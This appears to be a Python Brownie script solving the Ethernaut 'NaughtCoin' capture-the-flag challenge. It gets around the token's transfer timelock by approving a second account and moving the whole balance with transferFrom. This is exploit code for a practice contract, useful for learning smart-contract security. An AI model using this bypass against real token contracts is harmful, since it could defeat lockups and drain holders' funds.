from scripts.helper.context import *
from scripts.helper.account import _from, _from2, acc, acc2
from brownie import NaughtCoin

##########################################
# Goal of the exercise
#########################################

# test locally
def deploy_locally(ContractObject, from_account, constructor_params={}):
    return ContractObject.deploy(from_account, **constructor_params)

# solve the challenge
def solve_challenge(locally=False):
    # load challenge
    if not locally:
        naughtcoin = load_challenge(ContractObject=NaughtCoin, instance_key='naughtcoin')
    else:
        naughtcoin = deploy_locally(ContractObject=NaughtCoin, from_account=_from)

    # get balance of naughtcoin in my wallet
    balance_in_wallet = naughtcoin.balanceOf(acc.address)

    # approve all the naughtcoin to be transferred out by another wallet
    naughtcoin.approve(acc2.address, balance_in_wallet, _from)

    # transferFrom my account into acc2
    naughtcoin.transferFrom(acc.address, acc2.address, balance_in_wallet, _from2)

    # balance assertion
    balance_assertion = naughtcoin.balanceOf(acc.address) == 0
    print(f"The account balance has been drained: {balance_assertion}")

    return balance_assertion
    
def main():
    solve_challenge()
